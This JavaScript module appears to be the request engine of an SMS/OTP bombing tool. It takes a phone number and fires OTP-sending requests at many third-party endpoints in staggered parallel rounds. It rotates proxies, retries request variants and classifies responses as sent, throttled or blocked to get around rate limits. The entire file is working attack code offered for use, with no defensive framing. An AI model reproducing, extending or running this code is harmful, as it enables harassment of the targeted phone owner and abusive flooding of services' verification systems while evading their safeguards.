import { nextProxy, proxyCount } from './proxy.js';
import { sleep, truncate } from './util.js';

const REQUEST_TIMEOUT = 12_000;

const OK_RE =
  /("(success|status|Status|isSuccess|is_success)"\s*:\s*true)|(\botp\b[^.]{0,45}\b(sent|send|generated|dispatched)\b)|(\b(sent|send|generated)\b[^.]{0,45}\botp\b)|("code"\s*:\s*(200|0)\b)/i;

const FAIL_RE =
  /(invalid|not\s+valid|not\s+a\s+valid|already\s+(sent|registered|exist)|too\s+many|limit\s+exceed|rate\s+limit|failed|failure|"error"\s*:\s*true|"success"\s*:\s*false|expired|blocked|does\s+not\s+exist|required|missing)/i;

function verdict(http, text) {
  const body = text || '';
  if (http >= 200 && http < 300) {
    if (OK_RE.test(body)) return 'sent';
    if (FAIL_RE.test(body)) return 'throttled';
    if (body.trim() === '') return 'sent';
    return 'sent';
  }
  if (http === 429) return 'throttled';
  if (http === 401 || http === 403) return 'blocked';
  return 'failed';
}

function buildInit(desc, signal, dispatcher) {
  const init = { method: desc.method, headers: desc.headers, signal, redirect: 'follow' };
  if (desc.json) {
    init.body = JSON.stringify(desc.json);
  } else if (desc.form) {
    init.body = new URLSearchParams(desc.form).toString();
  }
  if (dispatcher) init.dispatcher = dispatcher;
  return init;
}

/**
 * Executes one endpoint hit with variant fallback, proxy rotation and direct retry.
 */
export async function hitEndpoint(ep, number, deadline) {
  const result = {
    id: ep.id,
    name: ep.name,
    endpoint: ep.url,
    status: 'failed',
    http: 0,
    ms: 0,
    note: '',
    via: 'direct',
    variant: 0,
  };

  const started = Date.now();

  for (let vi = 0; vi < ep.variants.length; vi++) {
    if (Date.now() >= deadline) {
      result.note = result.note || 'time budget exhausted';
      break;
    }

    const desc = ep.variants[vi](number);
    const url = desc.url || ep.url;
    result.variant = vi + 1;

    const attempts = [];
    const proxy = nextProxy();
    if (proxy) attempts.push(proxy);
    attempts.push(null); // direct fallback always available

    let lastNote = '';

    for (const attempt of attempts) {
      if (Date.now() >= deadline) break;

      const budget = Math.max(2500, Math.min(REQUEST_TIMEOUT, deadline - Date.now()));
      const ac = new AbortController();
      const timer = setTimeout(() => ac.abort(), budget);

      try {
        const res = await fetch(url, buildInit(desc, ac.signal, attempt?.agent));
        clearTimeout(timer);

        const text = await res.text().catch(() => '');
        result.http = res.status;
        result.via = attempt ? 'proxy' : 'direct';
        result.status = verdict(res.status, text);
        result.note = truncate(text, 140) || `HTTP ${res.status}`;

        if (result.status === 'sent') {
          result.ms = Date.now() - started;
          return result;
        }

        // 401/403 or throttled: variant retry rarely helps but is cheap on failure only
        lastNote = result.note;
      } catch (err) {
        clearTimeout(timer);
        const aborted = err?.name === 'AbortError';
        lastNote = aborted ? 'timeout' : `network: ${truncate(err?.message || 'error', 80)}`;
        result.note = lastNote;
        result.status = 'failed';
        result.http = 0;
        result.via = attempt ? 'proxy' : 'direct';
      }
    }

    if (result.status === 'throttled' || result.status === 'blocked') {
      result.ms = Date.now() - started;
      return result;
    }
  }

  result.ms = Date.now() - started;
  if (!result.note) result.note = 'all variants rejected';
  return result;
}

/**
 * Runs a round of endpoint hits in parallel with staggered starts.
 */
export async function runRound(items, number, deadline, staggerMs) {
  const tasks = items.map((ep, i) =>
    sleep(i * staggerMs).then(() => {
      if (Date.now() >= deadline) {
        return { id: ep.id, name: ep.name, endpoint: ep.url, status: 'skipped', http: 0, ms: 0, note: 'deadline', via: 'direct', variant: 0 };
      }
      return hitEndpoint(ep, number, deadline);
    })
  );
  return Promise.all(tasks);
}

export { proxyCount };
